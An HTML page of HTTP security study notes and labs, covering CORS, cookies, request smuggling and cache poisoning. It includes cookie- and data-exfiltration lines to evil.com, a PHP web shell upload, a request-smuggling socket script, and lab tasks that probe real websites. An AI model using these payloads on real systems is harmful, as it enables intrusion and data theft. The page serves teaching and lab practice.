@@ -1,0 +1,1094 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <script>
+      (function () {
+        const base = document.createElement("base");
+        if (location.hostname.includes("github.io")) {
+          base.href = `/HackBook/`;
+        } else {
+          const pathSegments = window.location.pathname
+            .split("/")
+            .filter((element) => element !== "");
+          const index = pathSegments.indexOf("HackBook");
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join("/") + "/";
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="assets\images\hacker.jpg" />
+
+    <title>HackBook | HTTP</title>
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Prism JS -->
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-markup.min.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/plugins/command-line/prism-command-line.css" />
+    <script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/command-line/prism-command-line.min.js"></script>
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+
+    <script src="assets\scripts\main.js"></script>
+    <link rel="stylesheet" href="assets\styles\styles.css" />
+  </head>
+  <body>
+    <!-- Main Content -->
+    <div class="content">
+      <h1>HTTP</h1>
+      <hr />
+
+      <div class="tab-container">
+        <div class="tab-buttons">
+          <button class="tab-btn active" data-tab="notes">Notes</button>
+          <button class="tab-btn" data-tab="lab">Lab</button>
+          <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+        </div>
+
+        <!-- NOTES TAB -->
+        <div class="tab-content active" id="notes">
+
+          <h2>HTTP Protocol Fundamentals</h2>
+
+          <h3>Request Structure</h3>
+          <pre><code class="language-bash">METHOD /path?query=value HTTP/1.1
+Host: example.com
+Header-Name: Header-Value
+Cookie: session=abc123
+Content-Type: application/json
+Content-Length: 27
+
+{"key":"value","num":42}</code></pre>
+
+          <h3>Response Structure</h3>
+          <pre><code class="language-bash">HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=xyz789; HttpOnly; Secure; SameSite=Strict
+X-Frame-Options: DENY
+Content-Length: 45
+
+&lt;html&gt;&lt;body&gt;Hello, World!&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+          <h3>HTTP Methods</h3>
+          <table>
+            <tr><th>Method</th><th>Idempotent</th><th>Body</th><th>Use Case</th></tr>
+            <tr><td><strong>GET</strong></td><td>Yes</td><td>No</td><td>Retrieve resource</td></tr>
+            <tr><td><strong>POST</strong></td><td>No</td><td>Yes</td><td>Submit data, create resource</td></tr>
+            <tr><td><strong>PUT</strong></td><td>Yes</td><td>Yes</td><td>Replace resource entirely</td></tr>
+            <tr><td><strong>PATCH</strong></td><td>No</td><td>Yes</td><td>Partial update</td></tr>
+            <tr><td><strong>DELETE</strong></td><td>Yes</td><td>Optional</td><td>Remove resource</td></tr>
+            <tr><td><strong>HEAD</strong></td><td>Yes</td><td>No</td><td>GET without body (check headers)</td></tr>
+            <tr><td><strong>OPTIONS</strong></td><td>Yes</td><td>No</td><td>CORS preflight, discover methods</td></tr>
+            <tr><td><strong>TRACE</strong></td><td>Yes</td><td>No</td><td>Echo request (debug) — usually disabled for security</td></tr>
+            <tr><td><strong>CONNECT</strong></td><td>No</td><td>N/A</td><td>Establish tunnel (HTTPS proxy)</td></tr>
+          </table>
+
+          <h3>Status Codes</h3>
+          <table>
+            <tr><th>Range</th><th>Category</th><th>Key Codes</th></tr>
+            <tr><td>1xx</td><td>Informational</td><td>100 Continue, 101 Switching Protocols (WebSocket)</td></tr>
+            <tr><td>2xx</td><td>Success</td><td>200 OK, 201 Created, 204 No Content, 206 Partial Content</td></tr>
+            <tr><td>3xx</td><td>Redirection</td><td>301 Permanent, 302 Found, 304 Not Modified, 307 Temp Redirect (preserve method)</td></tr>
+            <tr><td>4xx</td><td>Client Error</td><td>400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 405 Method Not Allowed, 429 Too Many Requests</td></tr>
+            <tr><td>5xx</td><td>Server Error</td><td>500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable</td></tr>
+          </table>
+
+          <!-- ==================== HEADERS ==================== -->
+          <h2>Security Headers</h2>
+          <table>
+            <tr><th>Header</th><th>Value Example</th><th>Purpose</th></tr>
+            <tr><td><strong>Content-Security-Policy</strong></td><td><code>default-src 'self'; script-src 'nonce-abc'</code></td><td>XSS mitigation — controls allowed sources for scripts, styles, images</td></tr>
+            <tr><td><strong>Strict-Transport-Security</strong></td><td><code>max-age=31536000; includeSubDomains</code></td><td>HSTS — force HTTPS for all future requests</td></tr>
+            <tr><td><strong>X-Frame-Options</strong></td><td><code>DENY</code> or <code>SAMEORIGIN</code></td><td>Clickjacking prevention — block framing</td></tr>
+            <tr><td><strong>X-Content-Type-Options</strong></td><td><code>nosniff</code></td><td>Prevent MIME-type sniffing (blocks polyglot attacks)</td></tr>
+            <tr><td><strong>X-XSS-Protection</strong></td><td><code>0</code> (disable)</td><td>Legacy XSS filter — modern CSP is preferred</td></tr>
+            <tr><td><strong>Referrer-Policy</strong></td><td><code>no-referrer</code> or <code>strict-origin</code></td><td>Controls Referer header leakage</td></tr>
+            <tr><td><strong>Permissions-Policy</strong></td><td><code>camera=(), microphone=()</code></td><td>Restrict browser features per-origin</td></tr>
+            <tr><td><strong>Cross-Origin-Opener-Policy</strong></td><td><code>same-origin</code></td><td>Isolate browsing context (Spectre mitigation)</td></tr>
+            <tr><td><strong>Cross-Origin-Resource-Policy</strong></td><td><code>same-origin</code></td><td>Prevent cross-origin reads of resource</td></tr>
+          </table>
+
+          <!-- ==================== COOKIES ==================== -->
+          <h2>Cookies</h2>
+
+          <h3>Set-Cookie Attributes</h3>
+          <pre><code class="language-bash">Set-Cookie: session=abc123; Path=/; Domain=.example.com; Max-Age=3600; HttpOnly; Secure; SameSite=Strict</code></pre>
+          <table>
+            <tr><th>Attribute</th><th>Effect</th><th>Security Impact</th></tr>
+            <tr><td><strong>HttpOnly</strong></td><td>Not accessible via <code>document.cookie</code></td><td>Prevents XSS cookie theft</td></tr>
+            <tr><td><strong>Secure</strong></td><td>Only sent over HTTPS</td><td>Prevents MITM interception</td></tr>
+            <tr><td><strong>SameSite=Strict</strong></td><td>Never sent in cross-site requests</td><td>CSRF protection (strict)</td></tr>
+            <tr><td><strong>SameSite=Lax</strong></td><td>Sent on top-level navigation GET only</td><td>CSRF protection (default in modern browsers)</td></tr>
+            <tr><td><strong>SameSite=None</strong></td><td>Always sent (requires Secure)</td><td>No CSRF protection — needed for cross-site embeds</td></tr>
+            <tr><td><strong>Domain</strong></td><td>Cookie sent to domain + subdomains</td><td>Overly broad = subdomain takeover risk</td></tr>
+            <tr><td><strong>Path</strong></td><td>Cookie scoped to path prefix</td><td>Not a security boundary (bypassable via iframes)</td></tr>
+          </table>
+
+          <h3>Cookie Manipulation in JavaScript</h3>
+          <pre><code class="language-javascript">// Read all cookies (non-HttpOnly only)
+document.cookie  // "name=value; other=data"
+
+// Set a cookie
+document.cookie = "user=admin; path=/; max-age=3600";
+
+// Delete a cookie (set expiry in past)
+document.cookie = "user=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
+
+// Parse cookies into object
+const cookies = Object.fromEntries(
+  document.cookie.split('; ').map(c => c.split('='))
+);</code></pre>
+
+          <!-- ==================== CORS ==================== -->
+          <h2>CORS (Cross-Origin Resource Sharing)</h2>
+
+          <h3>Same-Origin Policy</h3>
+          <p>Two URLs have the <strong>same origin</strong> if protocol, hostname, AND port all match. Cross-origin requests are blocked by default.</p>
+          <pre><code class="language-none">http://example.com/page    vs   http://example.com/other     ✓ Same origin
+http://example.com         vs   https://example.com          ✗ Different scheme
+http://example.com         vs   http://sub.example.com       ✗ Different host
+http://example.com         vs   http://example.com:8080      ✗ Different port</code></pre>
+
+          <h3>CORS Headers</h3>
+          <table>
+            <tr><th>Header</th><th>Direction</th><th>Purpose</th></tr>
+            <tr><td><code>Origin</code></td><td>Request</td><td>Browser-set: requesting origin</td></tr>
+            <tr><td><code>Access-Control-Allow-Origin</code></td><td>Response</td><td>Which origins can read the response (<code>*</code> or specific origin)</td></tr>
+            <tr><td><code>Access-Control-Allow-Credentials</code></td><td>Response</td><td><code>true</code> — allows cookies/auth headers (cannot use <code>*</code> for origin)</td></tr>
+            <tr><td><code>Access-Control-Allow-Methods</code></td><td>Response</td><td>Allowed methods for preflight</td></tr>
+            <tr><td><code>Access-Control-Allow-Headers</code></td><td>Response</td><td>Allowed request headers for preflight</td></tr>
+            <tr><td><code>Access-Control-Expose-Headers</code></td><td>Response</td><td>Response headers JS can read</td></tr>
+          </table>
+
+          <h3>CORS Misconfigurations</h3>
+          <pre><code class="language-javascript">// Dangerous: reflecting Origin header without validation
+// Server code (vulnerable):
+res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
+res.setHeader('Access-Control-Allow-Credentials', 'true');
+// → Any origin can read authenticated responses!
+
+// Exploit: attacker page reads victim's data cross-origin
+fetch('https://vulnerable.com/api/user', {credentials: 'include'})
+  .then(r => r.json())
+  .then(data => {
+    // Send stolen data to attacker
+    fetch('https://evil.com/steal?data=' + JSON.stringify(data));
+  });</code></pre>
+
+          <!-- ==================== FETCH API ==================== -->
+          <h2>JavaScript HTTP APIs</h2>
+
+          <h3>Fetch API</h3>
+          <pre><code class="language-javascript">// GET request
+const resp = await fetch('https://api.example.com/data');
+const json = await resp.json();
+
+// POST with JSON
+const resp = await fetch('/api/login', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({user: 'admin', pass: 'secret'})
+});
+
+// With cookies (same-origin: automatic; cross-origin: needs credentials)
+const resp = await fetch('/api/profile', {
+  credentials: 'include'  // 'same-origin' | 'include' | 'omit'
+});
+
+// Custom headers
+const resp = await fetch('/api/data', {
+  headers: {
+    'Authorization': 'Bearer ' + token,
+    'X-Custom': 'value'
+  }
+});
+
+// Upload file
+const formData = new FormData();
+formData.append('file', fileInput.files[0]);
+await fetch('/upload', {method: 'POST', body: formData});
+
+// Abort controller (timeout)
+const ctrl = new AbortController();
+setTimeout(() => ctrl.abort(), 5000);
+await fetch(url, {signal: ctrl.signal});</code></pre>
+
+          <h3>XMLHttpRequest (Legacy)</h3>
+          <pre><code class="language-javascript">const xhr = new XMLHttpRequest();
+xhr.open('GET', '/api/data', true);
+xhr.withCredentials = true;  // Send cookies cross-origin
+xhr.setRequestHeader('X-Custom', 'value');
+xhr.onload = function() {
+  if (xhr.status === 200) {
+    console.log(JSON.parse(xhr.responseText));
+  }
+};
+xhr.onerror = function() { console.error('Request failed'); };
+xhr.send();</code></pre>
+
+          <h3>WebSocket</h3>
+          <pre><code class="language-javascript">const ws = new WebSocket('wss://example.com/ws');
+
+ws.onopen = () => ws.send(JSON.stringify({type: 'auth', token: 'xxx'}));
+ws.onmessage = (e) => console.log('Received:', JSON.parse(e.data));
+ws.onerror = (e) => console.error('WS error:', e);
+ws.onclose = (e) => console.log('Closed:', e.code, e.reason);
+
+// Security: WebSocket has no same-origin policy!
+// Only the initial HTTP upgrade is subject to CORS-like checks
+// Server must validate Origin header manually</code></pre>
+
+          <h3>Beacon API &amp; sendBeacon</h3>
+          <pre><code class="language-javascript">// Guaranteed delivery even on page unload (exfiltration technique)
+navigator.sendBeacon('https://evil.com/log', JSON.stringify({
+  cookies: document.cookie,
+  url: location.href
+}));
+// Cannot read response — fire-and-forget
+// Used for analytics, but abusable for data exfiltration</code></pre>
+
+          <!-- ==================== REQUEST SMUGGLING ==================== -->
+          <h2>HTTP Request Smuggling</h2>
+          <p>Exploits discrepancies between how front-end (proxy/CDN) and back-end servers parse HTTP request boundaries.</p>
+
+          <h3>CL.TE (Content-Length vs Transfer-Encoding)</h3>
+          <pre><code class="language-bash">POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED</code></pre>
+          <p>Front-end uses Content-Length (reads 13 bytes). Back-end uses Transfer-Encoding chunked (sees <code>0\r\n\r\n</code> as end). "SMUGGLED" becomes the start of the next request on the back-end.</p>
+
+          <h3>TE.CL</h3>
+          <pre><code class="language-bash">POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+</code></pre>
+
+          <h3>HTTP/2 Smuggling (H2.CL)</h3>
+          <pre><code class="language-bash"># HTTP/2 request with mismatched content-length
+# Front-end downgrades to HTTP/1.1 for back-end
+:method: POST
+:path: /
+:authority: vulnerable.com
+content-length: 0
+
+GET /admin HTTP/1.1
+Host: vulnerable.com</code></pre>
+
+          <!-- ==================== CACHING ==================== -->
+          <h2>HTTP Caching &amp; Cache Poisoning</h2>
+
+          <h3>Cache-Control Directives</h3>
+          <table>
+            <tr><th>Directive</th><th>Effect</th></tr>
+            <tr><td><code>no-store</code></td><td>Never cache (sensitive data)</td></tr>
+            <tr><td><code>no-cache</code></td><td>Cache but revalidate every time</td></tr>
+            <tr><td><code>private</code></td><td>Only browser cache (not CDN/proxy)</td></tr>
+            <tr><td><code>public</code></td><td>Any cache can store</td></tr>
+            <tr><td><code>max-age=N</code></td><td>Fresh for N seconds</td></tr>
+            <tr><td><code>s-maxage=N</code></td><td>Shared cache max-age (CDN)</td></tr>
+          </table>
+
+          <h3>Cache Poisoning</h3>
+          <pre><code class="language-bash"># Inject malicious content into cache via unkeyed header
+GET / HTTP/1.1
+Host: vulnerable.com
+X-Forwarded-Host: evil.com
+
+# If server reflects X-Forwarded-Host in response (e.g., script src)
+# AND the cache keys on Host only (not X-Forwarded-Host)
+# → Cached response serves evil.com payload to all users</code></pre>
+
+          <h3>Web Cache Deception</h3>
+          <pre><code class="language-bash"># Trick cache into storing authenticated page
+# Victim visits: https://target.com/account/settings/nonexistent.css
+# Server: serves /account/settings (path normalization, 200 OK)
+# Cache: sees .css extension → caches it as static asset
+# Attacker: fetches the cached URL → gets victim's account page</code></pre>
+
+          <!-- ==================== HTTP VERSIONS ==================== -->
+          <h2>HTTP Versions</h2>
+          <table>
+            <tr><th>Version</th><th>Key Features</th><th>Security Notes</th></tr>
+            <tr><td><strong>HTTP/1.0</strong></td><td>One request per connection</td><td>No Host header required → virtual hosting issues</td></tr>
+            <tr><td><strong>HTTP/1.1</strong></td><td>Keep-alive, chunked encoding, Host required</td><td>Request smuggling via CL/TE ambiguity</td></tr>
+            <tr><td><strong>HTTP/2</strong></td><td>Binary framing, multiplexing, header compression (HPACK), server push</td><td>H2 smuggling, HPACK bombing, stream reset DoS</td></tr>
+            <tr><td><strong>HTTP/3</strong></td><td>QUIC (UDP), TLS 1.3 built-in, 0-RTT</td><td>0-RTT replay attacks, UDP amplification</td></tr>
+          </table>
+
+          <!-- ==================== ENCODING ==================== -->
+          <h2>Encoding &amp; Content Types</h2>
+
+          <h3>Content-Type Values</h3>
+          <table>
+            <tr><th>Type</th><th>Usage</th><th>Security Notes</th></tr>
+            <tr><td><code>application/json</code></td><td>JSON API body</td><td>Not subject to CSRF via forms (triggers preflight)</td></tr>
+            <tr><td><code>application/x-www-form-urlencoded</code></td><td>HTML form default</td><td>CSRF-able: browser sends without preflight</td></tr>
+            <tr><td><code>multipart/form-data</code></td><td>File upload, form with files</td><td>CSRF-able: no preflight needed</td></tr>
+            <tr><td><code>text/plain</code></td><td>Plain text</td><td>CSRF-able: no preflight. Useful for smuggling JSON in body</td></tr>
+            <tr><td><code>text/html</code></td><td>HTML response</td><td>XSS risk if user content reflected</td></tr>
+          </table>
+
+          <h3>URL Encoding</h3>
+          <pre><code class="language-javascript">// Encode/decode URL components
+encodeURIComponent('hello world&amp;foo=bar')  // "hello%20world%26foo%3Dbar"
+decodeURIComponent('hello%20world')         // "hello world"
+
+// encodeURI preserves URL structure chars (:/?#[]@!$&'()*+,;=)
+encodeURI('https://example.com/path?q=hello world')
+
+// Double encoding bypass
+// Server decodes once: %252F → %2F
+// WAF sees %252F (encoded), server sees / (decoded twice)</code></pre>
+
+          <h3>Base64</h3>
+          <pre><code class="language-javascript">// Browser
+btoa('Hello')           // "SGVsbG8="
+atob('SGVsbG8=')        // "Hello"
+
+// Node.js
+Buffer.from('Hello').toString('base64')       // "SGVsbG8="
+Buffer.from('SGVsbG8=', 'base64').toString()  // "Hello"
+
+// JWT payload decode
+JSON.parse(atob('eyJ1c2VyIjoiYWRtaW4ifQ'))  // {user: "admin"}</code></pre>
+
+          <!-- ==================== AUTH ==================== -->
+          <h2>Authentication Mechanisms</h2>
+          <table>
+            <tr><th>Mechanism</th><th>Header/Location</th><th>Attack Surface</th></tr>
+            <tr><td><strong>Basic Auth</strong></td><td><code>Authorization: Basic base64(user:pass)</code></td><td>Credentials in every request, no logout, base64 ≠ encryption</td></tr>
+            <tr><td><strong>Bearer Token</strong></td><td><code>Authorization: Bearer &lt;token&gt;</code></td><td>Token theft via XSS, no revocation without server state</td></tr>
+            <tr><td><strong>Session Cookie</strong></td><td><code>Cookie: session=abc</code></td><td>CSRF if no SameSite, XSS if no HttpOnly</td></tr>
+            <tr><td><strong>JWT</strong></td><td>Cookie or Authorization header</td><td>alg:none bypass, weak secrets, no revocation, client-side tampering</td></tr>
+            <tr><td><strong>API Key</strong></td><td>Header, query param, or body</td><td>Key leakage in logs/URLs, no fine-grained permissions</td></tr>
+            <tr><td><strong>OAuth 2.0</strong></td><td>Authorization code flow</td><td>Open redirects, CSRF on callback, token leakage via Referer</td></tr>
+          </table>
+
+          <!-- ==================== TOOLS ==================== -->
+          <h2>HTTP Tools Cheatsheet</h2>
+
+          <h3>curl</h3>
+          <pre><code class="language-bash"># GET request
+curl -v https://example.com/api/data
+
+# POST JSON
+curl -X POST https://example.com/api -H "Content-Type: application/json" -d '{"user":"admin"}'
+
+# With cookies
+curl -b "session=abc123" https://example.com/profile
+
+# Follow redirects
+curl -L https://example.com/redirect
+
+# Custom headers + ignore SSL
+curl -k -H "Authorization: Bearer TOKEN" https://api.example.com
+
+# Upload file
+curl -F "file=@shell.php" https://example.com/upload
+
+# Request smuggling test (CL.TE)
+curl -X POST https://target.com/ -H "Content-Length: 6" -H "Transfer-Encoding: chunked" -d $'0\r\n\r\nG'</code></pre>
+
+          <h3>JavaScript (fetch patterns for CTF)</h3>
+          <pre><code class="language-javascript">// CSRF PoC — auto-submit form
+document.body.innerHTML = '&lt;form id="f" method="POST" action="https://target.com/api/change-email"&gt;' +
+  '&lt;input name="email" value="attacker@evil.com"&gt;&lt;/form&gt;';
+document.getElementById('f').submit();
+
+// Exfiltrate data via fetch
+fetch('/api/secret', {credentials: 'include'})
+  .then(r => r.text())
+  .then(d => navigator.sendBeacon('https://evil.com/log', d));
+
+// Steal cookies (non-HttpOnly)
+new Image().src = 'https://evil.com/steal?c=' + encodeURIComponent(document.cookie);
+
+// Open redirect exploitation
+location = 'https://target.com/redirect?url=https://evil.com/phish';</code></pre>
+
+          <h3>Python (requests)</h3>
+          <pre><code class="language-python">import requests
+
+# Session with cookies
+s = requests.Session()
+s.post('https://target.com/login', data={'user':'admin','pass':'test'})
+r = s.get('https://target.com/api/flag')
+print(r.text)
+
+# Custom headers + proxy through Burp
+r = requests.get('https://target.com/api',
+    headers={'Authorization': 'Bearer TOKEN'},
+    proxies={'https': 'http://127.0.0.1:8080'},
+    verify=False)
+
+# File upload
+files = {'file': ('shell.php', '&lt;?php system($_GET["cmd"]); ?&gt;', 'image/png')}
+r = requests.post('https://target.com/upload', files=files)</code></pre>
+
+        </div>
+
+        <!-- LAB TAB -->
+        <div class="tab-content" id="lab">
+          <h2>Labs</h2>
+
+          <div class="lab-card">
+            <h4>Lab 1: HTTP Request &amp; Response Inspection</h4>
+            <span class="difficulty difficulty-easy">Easy</span>
+            <p class="objective">Objective: Use browser DevTools and curl to inspect HTTP requests/responses, identify headers, methods, and status codes.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Inspect raw HTTP with curl verbose mode
+curl -v https://httpbin.org/get
+curl -v -X POST https://httpbin.org/post -d "key=value"
+curl -v -X PUT https://httpbin.org/put -H "Content-Type: application/json" -d '{"a":1}'
+
+# Check headers only
+curl -I https://example.com
+
+# In browser: DevTools → Network tab → click any request → Headers</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Make a GET request to <code>httpbin.org/get</code>. Identify the request method, Host header, and User-Agent.</li>
+                <li>Make a POST request with JSON body. Verify the Content-Type header is set correctly.</li>
+                <li>Use <code>curl -I</code> to read response headers from 3 different sites. Identify which security headers are present/missing.</li>
+                <li>In browser DevTools, find a request that returns a Set-Cookie header. Note the cookie attributes.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 2: Cookie Security Audit</h4>
+            <span class="difficulty difficulty-easy">Easy</span>
+            <p class="objective">Objective: Examine cookies on a web application and identify missing security attributes.</p>
+            <div class="setup-code">
+<pre><code class="language-javascript">// In browser console on any website:
+document.cookie  // Shows non-HttpOnly cookies
+
+// Check all cookies via DevTools: Application → Cookies
+// Look for:
+// - Missing HttpOnly (accessible to XSS)
+// - Missing Secure (sent over HTTP)
+// - SameSite=None without Secure (invalid)
+// - Overly broad Domain (e.g., .example.com includes all subdomains)</code></pre>
+<pre><code class="language-python"># Python: inspect Set-Cookie headers
+import requests
+r = requests.get('https://target.com/login', allow_redirects=False)
+for cookie in r.cookies:
+    print(f"{cookie.name}: HttpOnly={cookie.has_nonstandard_attr('HttpOnly')}, "
+          f"Secure={cookie.secure}, SameSite={cookie.get_nonstandard_attr('SameSite')}")</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Visit 3 different websites. For each, list all cookies and their attributes in a table.</li>
+                <li>Identify any cookies missing HttpOnly that contain session-like values.</li>
+                <li>Check if any session cookies are missing the Secure flag.</li>
+                <li>Write a JavaScript snippet that reads all non-HttpOnly cookies and formats them as JSON.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 3: CORS Misconfiguration Exploitation</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Exploit a CORS misconfiguration that reflects the Origin header to steal authenticated data cross-origin.</p>
+            <div class="setup-code">
+<pre><code class="language-python"># vulnerable-server.py (Flask)
+from flask import Flask, request, jsonify, make_response
+app = Flask(__name__)
+
+@app.route('/api/profile')
+def profile():
+    resp = make_response(jsonify({"user": "admin", "flag": "FLAG{c0rs_m1sc0nf1g}"}))
+    # Vulnerable: reflects any Origin
+    origin = request.headers.get('Origin', '*')
+    resp.headers['Access-Control-Allow-Origin'] = origin
+    resp.headers['Access-Control-Allow-Credentials'] = 'true'
+    return resp
+
+app.run(port=5000)</code></pre>
+<pre><code class="language-markup">&lt;!-- attacker.html (serve from different origin, e.g., localhost:8080) --&gt;
+&lt;script&gt;
+fetch('http://localhost:5000/api/profile', {credentials: 'include'})
+  .then(r =&gt; r.json())
+  .then(data =&gt; {
+    document.body.textContent = 'Stolen: ' + JSON.stringify(data);
+  });
+&lt;/script&gt;</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Start the Flask server. Verify <code>/api/profile</code> returns data with proper cookies.</li>
+                <li>Serve attacker.html from a different port. Observe the cross-origin fetch succeeds.</li>
+                <li>Check the response headers — confirm Origin is reflected and credentials are allowed.</li>
+                <li>Fix the server: only allow specific trusted origins instead of reflecting.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 4: HTTP Request Smuggling (CL.TE)</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">Objective: Exploit a CL.TE request smuggling vulnerability to access an admin endpoint.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Use Burp Suite Repeater or raw socket
+# Front-end: uses Content-Length
+# Back-end: uses Transfer-Encoding: chunked
+
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: x</code></pre>
+<pre><code class="language-python"># Python exploit
+import socket
+
+payload = (
+    "POST / HTTP/1.1\r\n"
+    "Host: target.com\r\n"
+    "Content-Length: 35\r\n"
+    "Transfer-Encoding: chunked\r\n"
+    "\r\n"
+    "0\r\n"
+    "\r\n"
+    "GET /admin HTTP/1.1\r\n"
+    "X-Ignore: x"
+)
+
+s = socket.socket()
+s.connect(('target.com', 80))
+s.send(payload.encode())
+print(s.recv(4096).decode())</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Set up a lab with nginx (front-end) proxying to a Python/Node back-end.</li>
+                <li>Confirm the front-end uses CL and back-end uses TE by observing different behaviors.</li>
+                <li>Craft a smuggled request that makes the next user's request go to <code>/admin</code>.</li>
+                <li>Use Burp's HTTP Request Smuggler extension to automate detection.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 5: Cache Poisoning</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">Objective: Exploit a web cache by injecting a malicious response via an unkeyed header.</p>
+            <div class="setup-code">
+<pre><code class="language-python"># server.py — reflects X-Forwarded-Host in script tag
+from flask import Flask, request
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    host = request.headers.get('X-Forwarded-Host', 'cdn.example.com')
+    return f'&lt;html&gt;&lt;script src="https://{host}/app.js"&gt;&lt;/script&gt;&lt;body&gt;Hello&lt;/body&gt;&lt;/html&gt;'
+
+app.run()</code></pre>
+<pre><code class="language-bash"># Poisoning request (X-Forwarded-Host is not in cache key)
+curl -H "X-Forwarded-Host: evil.com" https://target.com/
+# Response: &lt;script src="https://evil.com/app.js"&gt;&lt;/script&gt;
+# This response gets cached → all users load evil.com/app.js</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Start the server behind a caching proxy (varnish, nginx cache, or Cloudflare dev mode).</li>
+                <li>Send a request with <code>X-Forwarded-Host: your-server.com</code>.</li>
+                <li>Verify the response is cached by fetching without the header — you should see the poisoned response.</li>
+                <li>Host a malicious <code>app.js</code> on your server that exfiltrates cookies.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 6: WebSocket Hijacking</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Exploit a WebSocket server that trusts client-sent identity to impersonate an admin.</p>
+            <div class="setup-code">
+<pre><code class="language-javascript">// ws-server.js
+const WebSocket = require('ws');
+const wss = new WebSocket.Server({ port: 8080 });
+
+wss.on('connection', (ws) => {
+  ws.on('message', (msg) => {
+    let data = JSON.parse(msg);
+    if (data.action === 'getFlag' && data.role === 'admin') {
+      ws.send(JSON.stringify({flag: 'FLAG{ws_n0_auth}'}));
+    } else {
+      ws.send(JSON.stringify({error: 'Unauthorized'}));
+    }
+  });
+});</code></pre>
+<pre><code class="language-javascript">// Exploit from browser console
+const ws = new WebSocket('ws://localhost:8080');
+ws.onmessage = (e) => console.log(e.data);
+ws.onopen = () => ws.send(JSON.stringify({action:'getFlag', role:'admin'}));</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Connect to the WebSocket server normally and send a request with <code>role: "user"</code>.</li>
+                <li>Modify the role to "admin" in the browser console — observe the flag returned.</li>
+                <li>Use Burp Suite's WebSocket history to intercept and modify messages.</li>
+                <li>Fix: implement server-side session validation instead of trusting client data.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 7: Security Header Analysis</h4>
+            <span class="difficulty difficulty-easy">Easy</span>
+            <p class="objective">Objective: Audit security headers on multiple websites and identify missing protections.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Automated header check
+curl -sI https://target.com | grep -iE "content-security|strict-transport|x-frame|x-content-type"
+
+# Using securityheaders.com API concept
+for site in google.com github.com example.com; do
+  echo "=== $site ==="
+  curl -sI "https://$site" | grep -iE "^(content-security|strict-transport|x-frame|x-content-type|referrer-policy|permissions-policy)"
+  echo
+done</code></pre>
+<pre><code class="language-javascript">// JavaScript: check current page headers (limited — can't read all response headers from JS)
+// Use fetch to check a same-origin resource
+fetch(location.href).then(r => {
+  console.log('CSP:', r.headers.get('Content-Security-Policy'));
+  console.log('HSTS:', r.headers.get('Strict-Transport-Security'));
+  console.log('XFO:', r.headers.get('X-Frame-Options'));
+});</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Check 5 websites for the presence of all security headers listed in the notes.</li>
+                <li>For each missing header, describe the attack it would prevent.</li>
+                <li>Find a website missing CSP — can you inject inline scripts?</li>
+                <li>Find a website missing X-Frame-Options — can you iframe it (clickjacking)?</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="lab-card">
